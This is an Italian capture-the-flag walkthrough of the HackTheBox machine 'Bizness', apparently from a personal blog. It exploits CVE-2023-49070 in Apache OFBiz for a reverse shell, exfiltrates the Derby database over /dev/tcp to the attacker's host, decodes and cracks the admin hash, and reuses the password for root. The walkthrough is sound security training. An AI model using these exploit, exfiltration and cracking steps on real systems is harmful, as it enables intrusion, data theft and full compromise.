---
title: "Bizness Walkthrough"
description: "Bizness è una macchina Linux di difficoltà easy che dimostra come sfruttare una vulnerabilità Remote Code Execution (RCE) pre-autenticazione in Apache OFBiz, identificata come [CVE-2023-49070](https://nvd.nist.gov/vuln/detail/CVE-2023-49070). L'exploit consente di ottenere una shell sul sistema nemico. Successivamente, l'enumerazione della configurazione di OFBiz rivela un hash di una password nel database Derby. Attraverso ricerca e analisi del codice, si converte l'hash in un formato standard riconoscibile dagli strumenti di cracking. La password decifrata viene infine utilizzata per ottenere l'accesso root."
author: dua2z3rr
date: 2025-07-31 7:00:00
categories: [Machines]
tags: ["Categoria: Web Application", "Area di Interesse: Databases", "Area di Interesse: Common Applications", "Vulnerabilità: Weak Credentials", "Vulnerabilità: Remote Code Execution", "Vulnerabilità: Misconfiguration", "Vulnerabilità: Insecure Design", "Codice: Java", "Codice: Python", "Servizio: NGINX", "Servizio: Apache OFBiz", "Tecnica: Reconnaissance", "Tecnica: Web Site Structure Discovery", "Tecnica: Configuration Analysis", "Tecnica: Password Reuse", "Tecnica: Password Cracking"]
image: /assets/img/bizness/bizness-logo-resized.png
---

## Enumerazione Esterna

### Scansione con Nmap

L'approccio iniziale a qualsiasi macchina HTB inizia con una scansione completa delle porte utilizzando Nmap.

```shell
nmap -sC -sV -vv -oA bizness -p 1-65535 10.10.11.252
# -sC per gli script di default
# -sV per la rilevazione delle versioni
# -vv per output dettagliato (doppio verbose)
```

```shell
Nmap scan report for bizness.htb (10.10.11.252)
Host is up, received echo-reply ttl 63 (0.048s latency).
Scanned at 2025-07-29 23:27:04 CEST for 50s
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE    REASON         VERSION
22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0B2izYdzgANpvBJW4Ym5zGRggYqa8smNlnRrVK6IuBtHzdlKgcFf+Gw0kSgJEouRe8eyVV9iAyD9HXM2L0N/17+rIZkSmdZPQi8chG/PyZ+H1FqcFB2LyxrynHCBLPTWyuN/tXkaVoDH/aZd1gn9QrbUjSVo9mfEEnUduO5Abf1mnBnkt3gLfBWKq1P1uBRZoAR3EYDiYCHbuYz30rhWR8SgE7CaNlwwZxDxYzJGFsKpKbR+t7ScsviVnbfEwPDWZVEmVEd0XYp1wb5usqWz2k7AMuzDpCyI8klc84aWVqllmLml443PDMIh1Ud2vUnze3FfYcBOo7DiJg7JkEWpcLa6iTModTaeA1tLSUJi3OYJoglW0xbx71di3141pDyROjnIpk/K45zR6CbdRSSqImPPXyo3UrkwFTPrSQbSZfeKzAKVDZxrVKq+rYtd+DWESp4nUdat0TXCgefpSkGfdGLxPZzFg0cQ/IF1cIyfzo1gicwVcLm4iRD9umBFaM2E=
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFMB/Pupk38CIbFpK4/RYPqDnnx8F2SGfhzlD32riRsRQwdf19KpqW9Cfpp2xDYZDhA3OeLV36bV5cdnl07bSsw=
|   256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOjcxHOO/Vs6yPUw6ibE6gvOuakAnmR7gTk/yE2yJA/3
80/tcp    open  http       syn-ack ttl 63 nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://bizness.htb/
|_http-server-header: nginx/1.18.0
443/tcp   open  ssl/http   syn-ack ttl 63 nginx 1.18.0
|_http-trane-info: Problem with XML parsing of /evox/about
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Issuer: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-12-14T20:03:40
| Not valid after:  2328-11-10T20:03:40
| MD5:   b182:2fdb:92b0:2036:6b98:8850:b66e:da27
| SHA-1: 8138:8595:4343:f40f:937b:cc82:23af:9052:3f5d:eb50
| -----BEGIN CERTIFICATE-----
| MIIDbTCCAlWgAwIBAgIUcNuUwJFmLYEqrKfOdzHtcHum2IwwDQYJKoZIhvcNAQEL
| BQAwRTELMAkGA1UEBhMCVUsxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
| GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAgFw0yMzEyMTQyMDAzNDBaGA8yMzI4
| MTExMDIwMDM0MFowRTELMAkGA1UEBhMCVUsxEzARBgNVBAgMClNvbWUtU3RhdGUx
| ITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAK4O2guKkSjwv8sruMD3DiDi1FoappVwDJ86afPZ
| XUCwlhtZD/9gPeXuRIy66QKNSzv8H7cGfzEL8peDF9YhmwvYc+IESuemPscZSlbr
| tSdWXVjn4kMRlah/2PnnWZ/Rc7I237V36lbsavjkY6SgBK8EPU3mAdHNdIBqB+XH
| ME/G3uP/Ut0tuhU1AAd7jiDktv8+c82EQx21/RPhuuZv7HA3pYdtkUja64bSu/kG
| 7FOWPxKTvYxxcWdO02GRXs+VLce+q8tQ7hRqAQI5vwWU6Ht3K82oftVPMZfT4BAp
| 4P4vhXvvcyhrjgjzGPH4QdDmyFkL3B4ljJfZrbXo4jXqp4kCAwEAAaNTMFEwHQYD
| VR0OBBYEFKXr9HwWqLMEFnr6keuCa8Fm7JOpMB8GA1UdIwQYMBaAFKXr9HwWqLME
| Fnr6keuCa8Fm7JOpMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB
| AFruPmKZwggy7XRwDF6EJTnNe9wAC7SZrTPC1gAaNZ+3BI5RzUaOkElU0f+YBIci
| lSvcZde+dw+5aidyo5L9j3d8HAFqa/DP+xAF8Jya0LB2rIg/dSoFt0szla1jQ+Ff
| 6zMNMNseYhCFjHdxfroGhUwYWXEpc7kT7hL9zYy5Gbmd37oLYZAFQv+HNfjHnE+2
| /gTR+RwkAf81U3b7Czl39VJhMu3eRkI3Kq8LiZYoFXr99A4oefKg1xiN3vKEtou/
| c1zAVUdnau5FQSAbwjDg0XqRrs1otS0YQhyMw/3D8X+f/vPDN9rFG8l9Q5wZLmCa
| zj1Tly1wsPCYAq9u570e22U=
|_-----END CERTIFICATE-----
|_http-favicon: Unknown favicon MD5: 7CF35F0B3566DB84C7260F0CC357D0B8
|_http-title: BizNess Incorporated
|_http-server-header: nginx/1.18.0
|_ssl-date: TLS randomness does not represent time
45017/tcp open  tcpwrapped syn-ack ttl 63
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Nel caso di Bizness, i risultati hanno rivelato:
1. Porta 22 (SSH): Servizio OpenSSH attivo, utile per accessi remoti ma non immediatamente sfruttabile senza credenziali.
2. Porta 80 (HTTP): Reindirizzamento automatico a HTTPS (porta 443), indicando un'impostazione di sicurezza comune.
3. Porta 443 (HTTPS): Servizio web con certificato SSL autofirmato, hosting di un sito chiamato "BizNess Incorporated".
4. Porta 45017: Servizio sconosciuto avvolto in tcpwrapped, spesso associato a servizi personalizzati o poco comuni.

### Configurazione Host

L'aggiunta del dominio al file */etc/hosts* è essenziale per risolvere correttamente il dominio durante le fasi successive.

```shell
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
# Others

10.10.11.252    bizness.htb
```

### Scansione Web

Il sito HTTPS presenta una pagina iniziale minimalista senza collegamenti navigabili.

![Desktop View](/assets/img/bizness/bizness-site.png)

Proviamo a fuzzare il sito con ffuf per delle directory:

```shell
ffuf -w /home/dua2z3rr/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt:FUZZ -u https://bizness.htb/FUZZ -fs 0 -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://bizness.htb/FUZZ
 :: Wordlist         : FUZZ: /home/dua2z3rr/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

                        [Status: 200, Size: 27200, Words: 9218, Lines: 523, Duration: 49ms]
control                 [Status: 200, Size: 34633, Words: 10468, Lines: 492, Duration: 7105ms]
:: Progress: [9648/1273819] :: Job [1/1] :: 441 req/sec :: Duration: [0:00:21] :: Errors: 0 ::
```

scopriamo */control*: directory critica che espone un'interfaccia di gestione di Apache OFBiz, un framework ERP open source.

![Desktop View](/assets/img/bizness/apache-ofbiz.png)

Iniziamo un altro scan ricorsivo con ffuf partendo dalla pagina */control*.

```shell
ffuf -w /home/dua2z3rr/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt:FUZZ -u https://bizness.htb/control/FUZZ -fw 10468 -ic --recursion

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://bizness.htb/control/FUZZ
 :: Wordlist         : FUZZ: /home/dua2z3rr/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 10468
________________________________________________

view                    [Status: 200, Size: 9308, Words: 913, Lines: 141, Duration: 461ms]
login                   [Status: 200, Size: 11060, Words: 1236, Lines: 186, Duration: 1415ms]
main                    [Status: 200, Size: 9308, Words: 913, Lines: 141, Duration: 1806ms]
help                    [Status: 200, Size: 10756, Words: 1182, Lines: 180, Duration: 2079ms]
logout                  [Status: 200, Size: 10756, Words: 1182, Lines: 180, Duration: 532ms]
views                   [Status: 200, Size: 9308, Words: 913, Lines: 141, Duration: 1834ms]
%20                     [Status: 200, Size: 34630, Words: 10469, Lines: 492, Duration: 911ms]
forgotPassword          [Status: 200, Size: 11060, Words: 1442, Lines: 175, Duration: 3002ms]
```

La pagina che ci interessa maggiormente è */login*.

![Desktop View](/assets/img/bizness/control-login.png)

Vediamo sulla pagina di login la versione di Apache OFBiz. 

![Desktop View](/assets/img/bizness/OFBiz-version.png)

L'identificazione della versione di OFBiz è fondamentale, poiché versioni specifiche sono affette da vulnerabilità note.

## Exploit

Adesso che abbiamo la versione, possiamo cercare se esistono vulnerabilità conosciute che ci permettano di superare la pagina di login, o meglio ancora, ottenere una shell.

![Desktop View](/assets/img/bizness/CVE-2023-49070.png)

La versione 18.12.10 di Apache OFBiz è affetta da una vulnerabilità di Remote Code Execution (RCE) pre-autenticazione in Apache OFBiz, identificata come [CVE-2023-49070](https://nvd.nist.gov/vuln/detail/CVE-2023-49070)

![Desktop View](/assets/img/bizness/github-exploit.png)

Procediamo a clonare la repository da github e scaricare il file necessario per l'exploit. Fatto questo, passiamo ad utilizzare l'exploit.

```shell
┌─[dua2z3rr@parrot]─[~/Boxes/Bizness/Exploit-CVE-2023-49070-and-CVE-2023-51467-Apache-OFBiz]
└──╼ $python3 ofbiz_exploit.py https://bizness.htb shell 10.10.14.6:9001
The target appears to be vulnerable.
[?] It is not possible to be certain of success. The target may not be truly vulnerable. [?]
Check if the reverse shell was established or if there is any command output.
```

Configuriamo un listener in ascolto con nc -lnvp 9001 per ricevere la connessione inversa dalla macchina nemica.

```shell
nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.11.252 39924
bash: cannot set terminal process group (570): Inappropriate ioctl for device
bash: no job control in this shell
ofbiz@bizness:/opt/ofbiz$
```

Una volta stabilita la shell, otteniamo accesso come utente ofbiz e recuperiamo la flag user.txt.

## Enumerazione Interna

### Database Derby

Con le informazioni che abbiamo ottenuto fin ora (Backend con apache OFBiz e presenza di una pagina di login) è facile assumere che esista un database. Cerchiamo online e nella documentazione che database utilizzi Apache OFBiz di default.

![Desktop View](/assets/img/bizness/ricerca-database-default.png)

La documentazione di OFBiz indica che utilizza Apache Derby come database predefinito. Leggendo la documentazione, capiamo che per accederci, dobbiamo utilizzare un tool (installato di default assieme a Derby) chiamato *ij*. sfortunatamente, il tool non è installato sulla macchina che ospita il database.

Quindi, comprimiamo la cartella /opt/ofbiz/runtime/data/derby/ofbiz e la trasferiamo in locale tramite Netcat.

```shell
ofbiz@bizness:/opt/ofbiz/runtime/data/derby$ tar cvf ofbiz.tar ofbiz
tar cvf ofbiz.tar ofbiz
ofbiz/
ofbiz/service.properties
ofbiz/seg0/
ofbiz/seg0/c10001.dat
ofbiz/seg0/c7161.dat
ofbiz/seg0/c12fe1.dat
ofbiz/seg0/cf4f1.dat
ofbiz/seg0/cc3f1.dat
<SNIP>
ofbiz/db.lck
ofbiz/log/
ofbiz/log/log36.dat
ofbiz/log/log37.dat
ofbiz/log/logmirror.ctrl
ofbiz/log/log.ctrl
ofbiz/log/README_DO_NOT_TOUCH_FILES.txt
ofbiz/README_DO_NOT_TOUCH_FILES.txt
ofbiz/dbex.lck
ofbiz@bizness:/opt/ofbiz/runtime/data/derby$ cat ofbiz.tar > /dev/tcp/10.10.14.6/4444
```

Installiamo localmente i pacchetti che ci servono, incluso ij:

```shell
┌─[dua2z3rr@parrot]─[~/Boxes/Bizness]
└──╼ $sudo apt install derby-tools
[sudo] password for dua2z3rr: 
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following additional packages will be installed:
  libderby-java libderbyclient-java
Suggested packages:
  derby-doc
The following NEW packages will be installed:
  derby-tools libderby-java libderbyclient-java

<SNIP>

┌─[dua2z3rr@parrot]─[~/Boxes/Bizness]
└──╼ $cd ofbiz
┌─[dua2z3rr@parrot]─[~/Boxes/Bizness/ofbiz]
└──╼ $ij
ij version 10.14
```

Adesso utilizziamo ij per connetterci al database locale:
```shell
ij> connect 'jdbc:derby:./ofbiz';
ij> SHOW TABLES;
TABLE_SCHEM         |TABLE_NAME                    |REMARKS             
------------------------------------------------------------------------
SYS                 |SYSALIASES                    |                    
SYS                 |SYSCHECKS                     |                    
SYS                 |SYSCOLPERMS                   |                    
SYS                 |SYSCOLUMNS                    |                    
SYS                 |SYSCONGLOMERATES              |                    
SYS                 |SYSCONSTRAINTS                |                    
<SNIP>
OFBIZ               |USER_AGENT_METHOD_TYPE        |                    
OFBIZ               |USER_AGENT_TYPE               |                    
OFBIZ               |USER_LOGIN                    |                    
OFBIZ               |USER_LOGIN_HISTORY            |                    
OFBIZ               |USER_LOGIN_PASSWORD_HISTORY   |                    
OFBIZ               |USER_LOGIN_SECURITY_GROUP     |                    
OFBIZ               |USER_LOGIN_SECURITY_QUESTION  |                    
OFBIZ               |USER_LOGIN_SESSION            |          
<SNIP>
```

La tabella USER_LOGIN potrebbe contenere informazioni molto interessanti riguardanti una possibile Privilege Escalation.

```shell
ij> SELECT USER_LOGIN_ID,CURRENT_PASSWORD FROM OFBIZ.USER_LOGIN;
USER_LOGIN_ID                                         |CURRENT_PASSWORD                                                                                                                
------------------------------------------------------------------------------------
system                                                |NULL                                                                                                                            
anonymous                                             |NULL                                                                                                                            
admin                                                 |$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I                                                                                              

3 rows selected
```

Ora che abbiamo l'hash dell'admin di sistema, non ci rimane altro che craccarlo. Proviamo a capire di che tipo di hash si tratta tramite hashid:

```shell
┌─[✗]─[dua2z3rr@parrot]─[~/Boxes/Bizness]
└──╼ $hashid -m '$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I'
Analyzing '$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I'
[+] Unknown hash
```

hashid non riconosce l'hash. L'hash non è in un formato standard. Torniamo sulla macchina nemica e facciamo ulteriore enumerazione.

### Analisi Crittografia

Dopo una lunga enumerazione, troviamo il file HashCrypt.java che sembra proprio fare al caso nostro.

```java
<SNIP>
public static boolean comparePassword(String crypted, String defaultCrypt, String password) {
    if (crypted.startsWith("{PBKDF2")) {
        return doComparePbkdf2(crypted, password);
    } else if (crypted.startsWith("{")) {
        return doCompareTypePrefix(crypted, defaultCrypt, password.getBytes(UtilIO.getUtf8()));
    } else if (crypted.startsWith("$")) {
        return doComparePosix(crypted, defaultCrypt, password.getBytes(UtilIO.getUtf8()));
    } else {
        return doCompareBare(crypted, defaultCrypt, password.getBytes(UtilIO.getUtf8()));
    }
}
<SNIP>
private static boolean doComparePosix(String crypted, String defaultCrypt, byte[] bytes) {
    int typeEnd = crypted.indexOf("$", 1);
    int saltEnd = crypted.indexOf("$", typeEnd + 1);
    String hashType = crypted.substring(1, typeEnd);
    String salt = crypted.substring(typeEnd + 1, saltEnd);
    String hashed = crypted.substring(saltEnd + 1);
    return hashed.equals(getCryptedBytes(hashType, salt, bytes));
}
<SNIP>
```

Da questo codice possiamo intuire che il nostro hash è SHA-1 e che il salt è una singola lettera d. Perciò, i nostri "hashed bytes" sono: *uP0_QaVBpDWFeo8-dRzDqRwXQ2I*


```java
private static String getCryptedBytes(String hashType, String salt, byte[] bytes) {
  try {
    MessageDigest messagedigest = MessageDigest.getInstance(hashType);
    messagedigest.update(salt.getBytes(UtilIO.getUtf8()));
    messagedigest.update(bytes);
    return Base64.encodeBase64URLSafeString(messagedigest.digest()).replace('+', '.');
  } catch (NoSuchAlgorithmException e) {
    throw new GeneralRuntimeException("Error while comparing password", e);
  }
}
```

Quest'ultimo metodo è molto importante. grazie a questo capiamo perché l'hash non è formattato come ci aspettiamo. Innanzitutto viene creato un oggetto *MessageDigest* e instanziato con l'hashtype SHA. poi è aggiornato con i byte del salt in UTF8-Encoding. Infine, viene codificato attraverso *Base64URLSafeEncoding* e tutti i caratteri *+* vengono sostituiti con *(.)*

```java
public static String encodeBase64URLSafeString(final byte[] binaryData) {
return StringUtils.newStringUsAscii(encodeBase64(binaryData, false, true));
}
```

Quindi, dobbiamo manualmente ripristinare l'hash al suo stato originale.

### Decodifica Hash

Per decodificare dobbiamo:
1. Ripristinare i caratteri originali: *uP0_QaVBpDWFeo8-dRzDqRwXQ2I* → *uP0/QaVBpDWFeo8+dRzDqRwXQ2I=*.
2. Decodificare da Base64 ed estrarre l'hash SHA-1 esadecimale: *b8fd3f41a541a435857a8f3e751cc3a91c174362*.

Per farlo, utilizziamo python3:

```shell
┌─[dua2z3rr@parrot]─[~/Boxes/Bizness]
└──╼ $python3
Python 3.11.2 (main, Apr 28 2025, 14:11:48) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> enc = "uP0_QaVBpDWFeo8-dRzDqRwXQ2I"
>>> enc = enc.replace('_', '/')
>>> enc = enc.replace('-', '+')
>>> enc
'uP0/QaVBpDWFeo8+dRzDqRwXQ2I'
>>> import base64
>>> enc += '='; dec = base64.b64decode(enc.encode('utf-8'))
>>> dec
b'\xb8\xfd?A\xa5A\xa45\x85z\x8f>u\x1c\xc3\xa9\x1c\x17Cb'
>>> import binascii
>>> binascii.hexlify(dec)
b'b8fd3f41a541a435857a8f3e751cc3a91c174362'
```

Ora, analizziamo nuovamente l'hash:

```shell
┌─[dua2z3rr@parrot]─[~/Boxes/Bizness]
└──╼ $hashid -m hash.txt
--File 'hash.txt'--
Analyzing 'b8fd3f41a541a435857a8f3e751cc3a91c174362'
[+] SHA-1 [Hashcat Mode: 100]
[+] Double SHA-1 [Hashcat Mode: 4500]
[+] RIPEMD-160 [Hashcat Mode: 6000]
[+] Haval-160 
[+] Tiger-160 
[+] HAS-160 
[+] LinkedIn [Hashcat Mode: 190]
[+] Skein-256(160) 
[+] Skein-512(160) 
--End of file 'hash.txt'--
```

```shell
┌─[dua2z3rr@parrot]─[~/Boxes/Bizness]
└──╼ $hashcat -a 0 -m 120 hash.txt /home/dua2z3rr/SecLists/Passwords/rockyou/rockyou.txt 
# -m 120: modalità sha1($salt.$pass)
hashcat (v6.2.6) starting

<SNIP>

Dictionary cache hit:
* Filename..: /home/dua2z3rr/SecLists/Passwords/rockyou/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

b8fd3f41a541a435857a8f3e751cc3a91c174362:d:monkeybizness  
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 120 (sha1($salt.$pass))
Hash.Target......: b8fd3f41a541a435857a8f3e751cc3a91c174362:d
Time.Started.....: Wed Jul 30 12:24:31 2025 (2 secs)
Time.Estimated...: Wed Jul 30 12:24:33 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/home/dua2z3rr/SecLists/Passwords/rockyou/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1068.7 kH/s (0.93ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1482752/14344385 (10.34%)
Rejected.........: 0/1482752 (0.00%)
Restore.Point....: 1474560/14344385 (10.28%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: mosnarak -> moes11
Hardware.Mon.#1..: Util: 27%

Started: Wed Jul 30 12:24:16 2025
Stopped: Wed Jul 30 12:24:34 2025
```

## Privilege Escalation

Torniamo sulla macchina nemica e eleviamo i nostri privilegi a root.

```shell
<k/base/src/main/java/org/apache/ofbiz/base/crypto$ su root
su root
Password: monkeybizness
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
```

Una volta ottenuto l'accesso root, recuperiamo la flag finale in /root/root.txt.

## Conclusione

Bizness dimostra come vulnerabilità note, combinate con pratiche di sicurezza deboli, possano compromettere interi sistemi. La comprensione approfondita di ogni componente (dallo stack web alla crittografia) è essenziale per difendersi efficacemente.
